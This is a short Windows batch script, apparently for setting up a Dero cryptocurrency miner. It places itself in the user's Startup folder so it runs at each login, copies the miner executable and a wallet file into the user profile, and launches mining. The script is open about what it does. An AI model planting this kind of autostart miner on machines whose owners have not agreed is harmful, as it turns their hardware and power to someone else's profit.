COPY /Y dminer.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
IF EXIST "%USERPROFILE%\DeroMiner" (
    FOR %%f IN (wallet_address.txt, minerx_64.bat, dero-miner-windows-amd64.exe) DO COPY /Y %%f "%USERPROFILE%\DeroMiner"
) ELSE (
    ECHO D | FOR %%f IN (wallet_address.txt, minerx_64.bat, dero-miner-windows-amd64.exe) DO XCOPY %%f "%USERPROFILE%\DeroMiner"
)
CMD /K "%USERPROFILE%\DeroMiner\minerx_64.bat"